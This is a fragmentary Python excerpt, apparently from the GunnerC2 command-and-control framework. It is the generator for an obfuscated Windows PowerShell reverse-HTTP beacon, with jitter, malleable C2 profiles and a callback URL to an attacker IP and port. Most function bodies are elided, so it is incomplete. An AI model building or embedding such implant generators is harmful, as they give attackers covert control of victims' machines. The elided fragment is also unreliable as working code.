# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\_0xsojalsec_gunnerc2.py\core.py\payload_generator.py\windows.py\http.py\powershell_reverse_http_0dd86138dded.py
# NOTE: extracted with static-only rules; review before use

# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\windows\http\powershell_reverse_http.py
...
from core.malleable_c2.malleable_c2 import (
    MalleableProfile,
    apply_client_profile,
    get_listener_by_port_and_transport,
...
def make_raw(
    ...
    byte_range,
    jitter,
    profile: Union[str, MalleableProfile, None] = None,
):
    ...
    if profile:
        ...
        formatted_headers = payutils.build_powershell_headers(cfg.client_headers, nostart=True, first=True)
        ...
        formatted_headers = payutils.build_powershell_headers(headers or {}, nostart=True, first=True)
...
def generate_windows_powershell_http(
    ip,
    port,
    obs,
    beacon_interval,
    ...
    if obs == 1:
        payload = generate_windows_powershell_http_obfuscate_level1(
            ip,
            port,
            beacon_interval,
            headers,
        ...
        payload = generate_windows_powershell_http_obfuscate_level2(
            ip,
            port,
            beacon_interval,
            headers,
...
def generate_windows_powershell_http_obfuscate_level1(
    ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile
):
    beacon_og_url = f"http://{ip}:{port}"
